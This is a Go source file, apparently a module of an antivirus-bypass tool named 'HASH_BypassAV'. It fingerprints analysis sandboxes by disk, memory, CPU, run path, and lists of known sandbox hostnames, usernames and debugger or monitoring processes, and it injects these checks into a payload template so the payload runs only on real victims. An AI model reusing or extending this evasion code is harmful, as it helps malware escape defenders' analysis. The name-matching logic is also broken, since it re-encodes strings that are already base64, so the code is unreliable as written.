package sandbox

import (
	"encoding/base64"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/mem"
	"github.com/shirou/gopsutil/process"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

func GetDisk() bool {
	diskPart, err := disk.Partitions(false)
	if err != nil {
		return false
	} else {
		if len(diskPart) == 1 {
			diskUsed, _ := disk.Usage(diskPart[0].Mountpoint)
			res := diskUsed.Total / 1024 / 1024 / 1024
			if res > 450 {
				return true
			} else {
				return false
			}
		} else {
			return true
		}
	}
}

func GetMemPercent() bool {
	memInfo, _ := mem.VirtualMemory()
	return memInfo.Total > 2000000000
}

func GetCpuCount() bool {
	c := runtime.GOMAXPROCS(0)
	return c >= 2
}

func NoBlockComputerName() bool {
	known := []string{
		"U0FOREJPWA==",
		"N1NJTFZJQQ==",
		"SEFOU1BFVEVSLVBD",
		"Sk9ITi1QQw==",
		"TVVFTExFUi1QQw==",
		"V0lONy1UUkFQUw==",
		"Rk9SVElORVQ=",
		"VEVRVUlMQUJPT01CT09N",
		"VkJDQ1NDLVBD",
		"REVTS1RPUC1TVk9OWFlE",
		"V0lOLTJIQlhTUktXQ1JZ",
		"V0lOLTJIQlhTUktXQ1JZ",
		"V0lOLUlWRTk5SlRURVE2",
		"V0lOLUhIUU1RRENCVDdF",
		"MENDNDdBQzgzODAz",
		"QU1BWklORy1BVk9DQURP",
		"cmJtaHV3dmNpbmc=",
		"U1RBQ0FTODQ=",
		"U0RKLUZGRDBGRUIwNURD"}
	name, _ := os.Hostname()

	for _, v := range known {
		if base64.URLEncoding.EncodeToString([]byte(v)) == name {
			return false
		}
	}
	return true

}

func NoBlockUserName() bool {
	known := []string{
		"Q3VycmVudFVzZXI=",
		"U2FuZGJveA==",
		"RW1pbHk=",
		"SEFQVUJXUw==",
		"SG9uZyBMZWU=",
		"SVQtQURNSU4=",
		"Sm9obnNvbg==",
		"TWlsbGVy",
		"bWlsb3pz",
		"UGV0ZXIgV2lsc29u",
		"dGltbXk=",
		"c2FuZCBib3g=",
		"bWFsd2FyZQ==",
		"bWFsdGVzdA==",
		"dGVzdCB1c2Vy",
		"dmlydXM=",
		"Sm9obiBEb2U=",
		"dmJjY3Ni",
		"amFzb24=",
		"am9qbw==",
		"bGljaGFv"}
	name, _ := user.Current()

	for _, v := range known {
		if base64.URLEncoding.EncodeToString([]byte(v)) == name.Username {
			return false
		}
	}
	return true

}

func NoBlockUserProcess() bool {
	known := []string{
		"b2xseWRiZy5leGU=",
		"UHJvY2Vzc0hhY2tlci5leGU=",
		"dGNwdmlldy5leGU=",
		"YXV0b3J1bnMuZXhl",
		"YXV0b3J1bnNjLmV4ZQ==",
		"ZmlsZW1vbi5leGU=",
		"cHJvY21vbi5leGU=",
		"cmVnbW9uLmV4ZQ==",
		"cHJvY2V4cC5leGU=",
		"aWRhcS5leGU=",
		"aWRhcTY0LmV4ZQ==",
		"SW1tdW5pdHlEZWJ1Z2dlci5leGU=",
		"V2lyZXNoYXJrLmV4ZQ==",
		"ZHVtcGNhcC5leGU=",
		"SG9va0V4cGxvcmVyLmV4ZQ==",
		"SW1wb3J0UkVDLmV4ZQ==",
		"UEVUb29scy5leGU=",
		"TG9yZFBFLmV4ZQ==",
		"U3lzSW5zcGVjdG9yLmV4ZQ==",
		"cHJvY19hbmFseXplci5leGU=",
		"c3lzQW5hbHl6ZXIuZXhl",
		"c25pZmZfaGl0LmV4ZQ==",
		"d2luZGJnLmV4ZQ==",
		"am9lYm94Y29udHJvbC5leGU=",
		"am9lYm94c2VydmVyLmV4ZQ==",
		"am9lYm94c2VydmVyLmV4ZQ==",
		"UmVzb3VyY2VIYWNrZXIuZXhl",
		"eDMyZGJnLmV4ZQ==",
		"eDY0ZGJnLmV4ZQ==",
		"RmlkZGxlci5leGU=",
		"aHR0cGRlYnVnZ2VyLmV4ZQ=="}
	pids, _ := process.Pids()
	pname := []string{}
	for _, pid := range pids {
		pn, _ := process.NewProcess(pid)
		pName, _ := pn.Name()
		pname = append(pname, pName)
	}

	for _, v := range pname {
		for _, v1 := range known {
			if base64.URLEncoding.EncodeToString([]byte(v1)) == v {
				return false
			}
		}
	}
	return true
}

func RunPath() bool {
	checkName := "run.exe"
	known := []string{
		"C:\\Users\\Public",
		"C:\\Programdata"}

	path := os.Args[0]
	Name := path[len(path)-len(checkName) : len(path)]
	spath := path[0 : len(path)-len(checkName)-1]
	if Name != checkName {
		return false
	}

	for _, v := range known {
		if spath == v {
			return true
		}
	}

	return false
}

func Runbefore() bool {
	time.Sleep(time.Duration(1) * time.Second)
	res := RunPath() && NoBlockUserProcess() && GetMemPercent() && GetCpuCount() && NoBlockUserName() && NoBlockComputerName()
	return res
}

func Addsandbox(template string) string {
	sandboxCode := "sandbox.Runbefore()"
	sandboxModule := "\"HASH_BypassAV/sandbox\""
	template = strings.ReplaceAll(template, "//__SANDBOXMODULE__", sandboxModule)
	return strings.ReplaceAll(template, "//__SANDBOX__", sandboxCode)
}
